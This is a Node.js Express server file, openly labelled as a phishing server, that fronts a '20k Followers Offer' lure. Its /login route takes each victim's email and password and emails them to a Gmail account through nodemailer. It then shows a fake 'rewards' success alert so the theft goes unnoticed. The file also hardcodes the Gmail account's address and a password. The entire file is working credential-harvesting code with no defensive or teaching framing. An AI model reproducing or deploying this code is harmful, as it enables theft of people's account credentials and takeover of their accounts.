const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware to parse JSON and URL-encoded forms
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// Configure Nodemailer with your Gmail credentials
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'isaacdakogre878@gmail.com',
        pass: 'V7#mQ2!zLp9@X4kR' // Replace this with your 16-digit App Password
    }
});

// Route to serve the phishing page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Route to handle login submission
app.post('/login', (req, res) => {
    const { email, password } = req.body;

    // Prepare the message
    const mailOptions = {
        from: 'isaacdakogre878@gmail.com',
        to: 'isaacdakogre878@gmail.com',
        subject: 'New Login Captured: 20k Followers Offer',
        text: `Victim Details:\nEmail: ${email}\nPassword: ${password}\n\nSource: Phishing Page`
    };

    // Send the email
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log('Error sending email:', error);
            res.status(500).send('Server error sending data.');
        } else {
            console.log('Email sent: ' + info.response);
            // Send a success message back to the user to keep them on the page or redirect
            res.send('<script>alert("Success! Redirecting to your rewards..."); window.location.href="/";</script>');
        }
    });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Phishing server running at http://localhost:${PORT}`);
});
